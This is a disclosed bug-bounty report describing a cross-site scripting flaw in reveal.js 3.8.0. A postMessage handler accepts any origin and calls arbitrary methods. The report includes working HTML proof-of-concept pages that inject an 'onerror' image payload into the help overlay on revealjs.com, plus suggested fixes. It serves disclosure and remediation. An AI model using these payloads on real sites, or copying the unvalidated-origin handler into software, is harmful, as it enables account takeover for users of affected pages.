# [reveal.js] XSS by calling arbitrary method via postMessage

## Report Details
- **Report ID**: 691977
- **URL**: https://hackerone.com/reports/691977
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-09-10T18:29:45.135Z
- **Disclosed**: 2020-02-18T13:55:42.321Z

## Reporter
- **Username**: s_p_q_r
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report XSS in reveal.js
It allows gaining access to the victim's account and performing actions on his behalf

# Module

**module name:** reveal.js
**version:** 3.8.0
**npm page:** `https://www.npmjs.com/package/reveal.js`

## Module Description

> A framework for easily creating beautiful presentations using HTML. Check out the live demo.
> 
> reveal.js comes with a broad range of features including nested slides, Markdown contents, PDF export, speaker notes and a JavaScript API. There's also a fully featured visual editor and platform for sharing reveal.js presentations at slides.com.

## Module Stats

[N/A] downloads in the last day
[4666] downloads in the last week
[N/A] downloads in the last month

# Vulnerability

## Vulnerability Description

The `setupPostMessage` function accepts messages from arbitrary origins and allows calling any method available in Reveal:

```javascript
function setupPostMessage() {
	
	if( config.postMessage ) {
		window.addEventListener( 'message', function ( event ) {
			var data = event.data;
			
			// Make sure we're dealing with JSON
			if( typeof data === 'string' && data.charAt( 0 ) === '{' && data.charAt( data.length - 1 ) === '}' ) {
				data = JSON.parse( data );

				// Check if the requested method can be found
				if( data.method && typeof Reveal[data.method] === 'function' ) {
					Reveal[data.method].apply( Reveal, data.args );
				}
			}
		}, false );
	}
}
```

For the proof of concept let's consider the `addKeyBinding` method. It pushes the provided key data (code, description and callback) into the `registeredKeyBindings` array:

```javascript
function addKeyBinding( binding, callback ) {
	
	if( typeof binding === 'object' && binding.keyCode ) {
		registeredKeyBindings[binding.keyCode] = {
			callback: callback,
			key: binding.key,
			description: binding.description
		};
	}
	else {
		registeredKeyBindings[binding] = {
			callback: callback,
			key: null,
			description: null
		};
	}
	
}
```

which in its turn is put into HTML without sufficient validation within the `showHelp` method:

```javascript
function showHelp() {
	
	...
	
	for( var binding in registeredKeyBindings ) {
		if( registeredKeyBindings[binding].key && registeredKeyBindings[binding].description ) {
			html += '<tr><td>' + registeredKeyBindings[binding].key + '</td><td>' + registeredKeyBindings[binding].description + '</td></tr>';
		}
	}
	
	...
	
}
```

All in all this allows the attacker to perform XSS via postMessage by submitting payloads in its data (PoC against the https://revealjs.com homepage):

```html
<html>
    <head>
        <title>XSS</title>
        
		<style>
			iframe
			{
				width: 100%;
				height: 100%;
				border: none;
			}
		</style>
    </head>
    <body>
        <iframe name="reveal" src="https://revealjs.com" onload="xss()"></iframe>

        <script>
            var frame = window.frames.reveal
            
            function xss ()
            {
                frame.postMessage ('{"method":"addKeyBinding","args":[{"keyCode":666,"key":"Pwned","description":"<img src=x onerror=alert(document.domain)>"}]}', '*')
                frame.postMessage ('{"method":"toggleHelp"}', '*')
            }
        </script>
    </body>
</html>
```

http://spqr.zz.mu/reveal.php

```html
<script>
    var win = window.open ('https://revealjs.com')
    
    function xss ()
    {
        win.postMessage ('{"method":"addKeyBinding","args":[{"keyCode":666,"key":"Pwned","description":"<img src=x onerror=alert(document.domain)>"}]}', '*')
        win.postMessage ('{"method":"toggleHelp"}', '*')
    }
    
    setTimeout (xss, 500)
</script>
```

http://spqr.zz.mu/reveal_open.php


## Steps To Reproduce:

Open one of these links in any browser and wait for the page to load:

* http://spqr.zz.mu/reveal.php
* http://spqr.zz.mu/reveal_open.php

{F579591}

## Patch

* Use secure HTML assignment at the `showHelp` method
* Check other available methods for similar vulnerabilites
* By default allow calling secure methods only
* By default turn on secure configs only
* Prohibit overriding them via seach params
* By default allow messages from whitelisted origins only

## Supporting Material/References:

- Any
- 4.0.0 or later
- Any
- Any
- Any

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 

# Hunter's comments and funny memes goes here

[Presentation with reveal.js about xss](https://github.com/fabidick22/presentation-xss)

{F579592}

## Impact

Gaining access to the victim's account and performing actions on his behalf

## Attachments
- xss_dawg.jpg
